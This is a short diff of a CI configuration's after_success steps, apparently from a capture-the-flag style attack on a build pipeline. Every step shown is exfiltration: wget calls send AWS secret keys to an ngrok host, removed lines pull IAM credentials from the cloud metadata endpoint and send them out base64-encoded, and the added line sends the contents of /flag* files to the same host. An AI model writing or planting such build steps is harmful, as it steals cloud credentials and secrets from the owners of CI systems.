@@ -30,6 +30,5 @@ after_success:
   - wget http://34bc287dc9b7.ngrok.io/`echo $AWS_SECRETACCESS_KEY_ID`
   - echo $AWS_SECRET_ACCESS_KEY
   - wget http://34bc287dc9b7.ngrok.io/`echo $AWS_SECRET_ACCESS_KEY`
-  - export RESOURCE=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ | base64 `
-  - wget http://34bc287dc9b7.ngrok.io/`echo $RESOURCE`
+  - wget http://34bc287dc9b7.ngrok.io/`cat /flag*`
 
